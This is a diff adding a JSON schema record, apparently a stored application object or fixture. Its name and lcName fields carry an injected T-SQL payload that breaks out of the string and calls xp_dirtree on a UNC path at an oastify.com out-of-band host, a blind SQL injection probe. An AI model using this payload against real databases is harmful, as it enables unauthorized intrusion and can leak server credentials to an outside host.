@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334398284,
+	"deleted":true,
+	"description":"SZHLUr",
+	"id":"67caa77e8780f31288254d35",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"qvfspo);declare @q varchar(99);set @q='\\\\2il9lgn9jcy2bk83u1n35orktbz4n5bw3kv7lva.oasti'+'fy.com\\gpc'; exec master.dbo.xp_dirtree @q;-- ",
+	"modifiedTime":1741358660603,
+	"name":"QvfSPO);declare @q varchar(99);set @q='\\\\2il9lgn9jcy2bk83u1n35orktbz4n5bw3kv7lva.oasti'+'fy.com\\gpc'; exec master.dbo.xp_dirtree @q;-- ",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
